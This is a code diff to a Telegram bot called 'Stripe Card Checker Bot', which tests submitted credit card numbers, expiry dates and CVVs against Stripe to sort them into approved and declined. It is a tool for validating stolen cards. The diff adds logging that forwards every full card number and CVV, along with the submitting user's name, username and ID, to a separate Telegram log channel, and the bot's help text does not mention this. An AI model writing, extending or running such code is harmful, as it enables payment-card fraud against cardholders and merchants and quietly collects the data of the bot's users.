@@ -11,9 +11,10 @@ import asyncio
 import signal
 import sys
 from concurrent.futures import ThreadPoolExecutor
-from telegram import Update
+from telegram import Update, Bot
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import concurrent.futures
+from datetime import datetime
 
 # Configure logging
 logging.basicConfig(
@@ -26,15 +27,104 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Get bot token from environment variable
+# Get bot token and log channel from environment variables
 BOT_TOKEN = os.getenv('BOT_TOKEN')
+LOG_CHANNEL_ID = os.getenv('LOG_CHANNEL_ID')  # Add this to your environment variables
+
 if not BOT_TOKEN:
     logger.error("BOT_TOKEN environment variable not set!")
     sys.exit(1)
 
+if not LOG_CHANNEL_ID:
+    logger.warning("LOG_CHANNEL_ID not set. Logging to channel disabled.")
+
 # Global application instance for graceful shutdown
 app = None
 file_lock = threading.Lock()
+
+# Log channel functionality
+async def log_to_channel(message: str, bot: Bot = None):
+    """Send log message to the designated log channel"""
+    if not LOG_CHANNEL_ID or not bot:
+        return
+    
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        formatted_message = f"🕐 {timestamp}\n{message}"
+        
+        await bot.send_message(
+            chat_id=LOG_CHANNEL_ID,
+            text=formatted_message,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Failed to send log to channel: {e}")
+
+async def log_user_interaction(update: Update, action: str, details: str = ""):
+    """Log user interactions to the channel"""
+    if not LOG_CHANNEL_ID:
+        return
+    
+    user = update.effective_user
+    chat = update.effective_chat
+    
+    log_message = f"""
+📊 **USER INTERACTION LOG**
+
+👤 **User:** {user.full_name} (@{user.username or 'No username'})
+🆔 **User ID:** `{user.id}`
+💬 **Chat:** {chat.title or 'Private Chat'} (`{chat.id}`)
+🎯 **Action:** {action}
+📝 **Details:** {details}
+    """
+    
+    try:
+        bot = update.get_bot()
+        await log_to_channel(log_message, bot)
+    except Exception as e:
+        logger.error(f"Failed to log user interaction: {e}")
+
+async def log_card_processing(card_data: str, result: dict, user_info: dict, bot: Bot):
+    """Log card processing results to the channel"""
+    if not LOG_CHANNEL_ID:
+        return
+    
+    status_emoji = {
+        'APPROVED': '✅',
+        'DECLINED': '❌',
+        'ERROR': '⚠️',
+        'UNKNOWN': '❓'
+    }
+    
+    emoji = status_emoji.get(result['status'], '❓')
+    
+    log_message = f"""
+💳 **CARD PROCESSING LOG**
+
+👤 **User:** {user_info.get('name', 'Unknown')} (@{user_info.get('username', 'No username')})
+🆔 **User ID:** `{user_info.get('id', 'Unknown')}`
+💳 **Card:** `{card_data}`
+{emoji} **Result:** {result['status']}
+📝 **Message:** {result.get('message', 'No message')}
+⏱️ **Processing Time:** {result.get('time', 'Unknown')}s
+    """
+    
+    await log_to_channel(log_message, bot)
+
+async def log_system_event(event_type: str, details: str, bot: Bot = None):
+    """Log system events to the channel"""
+    if not LOG_CHANNEL_ID:
+        return
+    
+    log_message = f"""
+🔧 **SYSTEM EVENT LOG**
+
+📋 **Event Type:** {event_type}
+📝 **Details:** {details}
+    """
+    
+    if bot:
+        await log_to_channel(log_message, bot)
 
 def extract_nonce(response_text, url):
     soup = BeautifulSoup(response_text, 'html.parser')
@@ -158,10 +248,12 @@ def process_cc(ccc):
 
         payment_method_id = create_payment_method(cc, m, y, cvv)
         if not payment_method_id:
+            timer = round(time.time() - start_time, 1)
             return {
                 'status': 'DECLINED',
-                'message': f"💳 {cc}|{m}|{y}|{cvv}\n❌ **DECLINED** - Payment method creation failed\n⏱️ Time: {round(time.time() - start_time, 1)}s",
-                'card': ccc
+                'message': f"💳 {cc}|{m}|{y}|{cvv}\n❌ **DECLINED** - Payment method creation failed\n⏱️ Time: {timer}s",
+                'card': ccc,
+                'time': timer
             }
 
         result = create_setup_intent(payment_method_id, cc)
@@ -198,7 +290,8 @@ def process_cc(ccc):
         return {
             'status': status,
             'message': f"💳 {cc}|{m}|{y}|{cvv}\n{emoji} **{status}** - {message}\n⏱️ Time: {timer}s",
-            'card': ccc
+            'card': ccc,
+            'time': timer
         }
 
     except Exception as e:
@@ -207,13 +300,17 @@ def process_cc(ccc):
         return {
             'status': 'ERROR',
             'message': f"💳 {ccc}\n⚠️ **ERROR** - Processing error\n⏱️ Time: {timer}s",
-            'card': ccc
+            'card': ccc,
+            'time': timer
         }
 
 def process_card_thread(card_data):
     return process_cc(card_data.strip())
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Log user interaction
+    await log_user_interaction(update, "START_COMMAND", "User started the bot")
+    
     welcome_message = """
 🤖 **Stripe Card Checker Bot**
 
@@ -221,7 +318,7 @@ Commands:
 /start - Show this help message
 /chk <card> - Check a single card
 /mass <cards> - Check multiple cards using threading
-/bulk - Process all cards from db.txt
+#/bulk - Process all cards from db.txt
 /stats - Show processing statistics
 
 Send me a card in the format: 1234567890123456|12|25|123
@@ -230,6 +327,7 @@ Send me a card in the format: 1234567890123456|12|25|123
 
 async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
+        await log_user_interaction(update, "CHK_COMMAND_ERROR", "No card provided")
         await update.message.reply_text("❌ Please provide a card in format: /chk 1234567890123456|12|25|123")
         return
 
@@ -237,12 +335,23 @@ async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     dados = card_data.split("|")
 
     if len(dados) != 4:
+        await log_user_interaction(update, "CHK_COMMAND_ERROR", f"Invalid format: {card_data}")
         await update.message.reply_text("❌ Invalid format. Use: 1234567890123456|12|25|123")
         return
 
+    await log_user_interaction(update, "CHK_COMMAND", f"Checking single card: {card_data}")
+    
     processing_msg = await update.message.reply_text("🔄 Processing card...")
 
     result = process_cc(card_data)
+    
+    # Log card processing result
+    user_info = {
+        'name': update.effective_user.full_name,
+        'username': update.effective_user.username,
+        'id': update.effective_user.id
+    }
+    await log_card_processing(card_data, result, user_info, update.get_bot())
 
     await update.message.reply_text(result['message'], parse_mode='Markdown')
 
@@ -270,6 +379,8 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid card data found.")
         return
 
+    await log_user_interaction(update, "MASS_COMMAND", f"Processing {len(card_lines)} cards")
+    
     processing_msg = await update.message.reply_text(f"🚀 Processing {len(card_lines)} cards with threading...")
 
     start_time = time.time()
@@ -282,18 +393,29 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
 
         results = []
+        user_info = {
+            'name': update.effective_user.full_name,
+            'username': update.effective_user.username,
+            'id': update.effective_user.id
+        }
+        
         for future in concurrent.futures.as_completed(future_to_card):
             card = future_to_card[future]
             try:
                 result = future.result()
                 results.append(result)
+                # Log each card processing result
+                await log_card_processing(card, result, user_info, update.get_bot())
             except Exception as exc:
                 logger.error(f'Card {card} generated an exception: {exc}')
-                results.append({
+                error_result = {
                     'status': 'ERROR',
                     'message': f"❌ Error processing: {card.strip()}",
-                    'card': card.strip()
-                })
+                    'card': card.strip(),
+                    'time': 0
+                }
+                results.append(error_result)
+                await log_card_processing(card, error_result, user_info, update.get_bot())
 
     try:
         await processing_msg.delete()
@@ -332,8 +454,17 @@ Total processed: {len(card_lines)}
 🚀 Threading used: {max_workers} workers
     """
     await update.message.reply_text(summary, parse_mode='Markdown')
+    
+    # Log mass check completion
+    await log_system_event(
+        "MASS_CHECK_COMPLETE", 
+        f"User {update.effective_user.full_name} completed mass check: {approved} approved, {declined} declined, {errors} errors",
+        update.get_bot()
+    )
 
 async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await log_user_interaction(update, "BULK_COMMAND", "Started bulk processing from db.txt")
+    
     caminho = os.path.join(os.path.dirname(__file__), "db.txt")
 
     if not os.path.exists(caminho):
@@ -354,6 +485,11 @@ async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     processing_msg = await update.message.reply_text(f"🔄 Processing {len(linhas)} cards...")
 
     approved = declined = errors = unknown = 0
+    user_info = {
+        'name': update.effective_user.full_name,
+        'username': update.effective_user.username,
+        'id': update.effective_user.id
+    }
 
     for linha in linhas[:]:
         if not linha.strip():
@@ -365,6 +501,9 @@ async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             continue
 
         result = process_cc(linha.strip())
+        
+        # Log card processing result
+        await log_card_processing(linha.strip(), result, user_info, update.get_bot())
 
         if result['status'] == 'APPROVED':
             approved += 1
@@ -402,15 +541,32 @@ async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 Total processed: {approved + declined + errors + unknown}
     """
     await update.message.reply_text(summary, parse_mode='Markdown')
+    
+    # Log bulk check completion
+    await log_system_event(
+        "BULK_CHECK_COMPLETE", 
+        f"User {update.effective_user.full_name} completed bulk check: {approved} approved, {declined} declined, {errors} errors",
+        update.get_bot()
+    )
 
 async def handle_card_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     dados = text.split("|")
 
     if len(dados) == 4:
+        await log_user_interaction(update, "DIRECT_CARD_INPUT", f"Processing card: {text}")
+        
         processing_msg = await update.message.reply_text("🔄 Processing card...")
 
         result = process_cc(text)
+        
+        # Log card processing result
+        user_info = {
+            'name': update.effective_user.full_name,
+            'username': update.effective_user.username,
+            'id': update.effective_user.id
+        }
+        await log_card_processing(text, result, user_info, update.get_bot())
 
         await update.message.reply_text(result['message'], parse_mode='Markdown')
 
@@ -419,9 +575,12 @@ async def handle_card_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         except Exception as e:
             logger.error(f"Failed to delete processing message: {e}")
     else:
+        await log_user_interaction(update, "INVALID_CARD_FORMAT", f"Invalid format: {text}")
         await update.message.reply_text("❌ Invalid format. Use: 1234567890123456|12|25|123")
 
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await log_user_interaction(update, "STATS_COMMAND", "Requested statistics")
+    
     files = ['approved.txt', 'dead.txt', 'error.txt', 'unknown.txt']
     stats_text = "📊 **Statistics**\n\n"
 
@@ -441,6 +600,14 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logger.error(f"Exception while handling an update: {context.error}")
+    
+    # Log error to channel if possible
+    if hasattr(context, 'bot') and context.bot:
+        await log_system_event(
+            "BOT_ERROR", 
+            f"Error occurred: {context.error}",
+            context.bot
+        )
 
 def signal_handler(signum, frame):
     logger.info(f"Received signal {signum}. Shutting down gracefully...")
@@ -471,7 +638,7 @@ def main():
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CommandHandler("chk", check_single_card))
         app.add_handler(CommandHandler("mass", mass_check))
-        app.add_handler(CommandHandler("bulk", bulk_check))
+        #app.add_handler(CommandHandler("bulk", bulk_check))
         app.add_handler(CommandHandler("stats", stats))
 
         # Add message handler for direct card input
@@ -479,6 +646,16 @@ def main():
 
         # Add error handler
         app.add_error_handler(error_handler)
+
+        # Log bot startup
+        if LOG_CHANNEL_ID:
+            async def startup_log():
+                await log_system_event("BOT_STARTUP", "Stripe Card Checker Bot started successfully", app.bot)
+            
+            # Schedule startup log
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(startup_log())
 
         # Start the bot with polling
         logger.info("Bot started with polling...")
